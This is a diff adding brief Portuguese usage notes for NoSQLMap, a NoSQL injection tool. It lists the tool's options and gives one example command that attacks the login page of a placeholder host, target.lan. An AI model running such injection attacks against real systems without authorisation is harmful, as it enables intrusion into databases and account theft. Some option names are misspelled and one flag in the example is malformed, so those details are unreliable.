@@ -1,0 +1,15 @@
+O NOSQL MAP É UMA FERRAMENTA PYTHO QUE AUTOMATIZA A INJEÇÃO A BANCOS DE DADOS NÃO RELACIONAIS.
+
+COMANDOS:
+— atack 2 — Use os ataques do NoSQL Web App
+— víctim target.lan — O host de destino é target.lan
+— webPort 80 — O servidor web de destino está escutando na porta 80
+— uri /login — O caminho da web para atacar
+— httpMethod POST — Use solicitações POST
+— postData email,test@test.test,password,qwerty — Use esses dados CSV para solicitação POST
+— injectedParameter 1 — Injeta no primeiro parâmetro (conforme listado por NoSQLMap)
+— injectSize 4 — Os valores de string aleatórios injetados devem ter 4 caracteres
+— injectFormat 2 — Para strings injetadas, use o formato “somente letras”
+— savePath output.log — Salve todas as descobertas em um arquivo chamado output.log
+
+	EXEMPLO DE CÓDIGO: nosqlmap.py --attack 2 --victim target.lan --webPort 80 --uri /login --httpMethod POST --postData email,test@test.test,password,qwerty --injectedParameter 1 -- injectSize 4 --injectFormat 2 --savePath output.log 
